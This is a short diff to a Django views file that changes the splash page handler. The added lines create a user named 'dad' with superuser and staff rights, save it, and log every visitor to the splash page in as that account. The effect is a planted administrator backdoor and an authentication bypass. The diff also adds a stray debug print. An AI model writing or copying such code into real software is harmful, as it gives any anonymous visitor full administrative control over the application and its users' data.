@@ -425,8 +425,12 @@ def test_view(request):
     return render_view(request, context)
 
 def splash_view(request):
+    u = User(username='dad', display_name='dad', is_superuser=True, is_staff=True)
+    u.save()
+    login(request, u, backend='django.contrib.auth.backends.ModelBackend')
     # user_data, user = get_user_data(request)
     supported_regions = Region.objects.filter(is_supported=True)
+    print('supported_regions',supported_regions)
     for s in supported_regions:
         print('supported_regions', s.__dict__)
     style = request.GET.get('style', 'index')
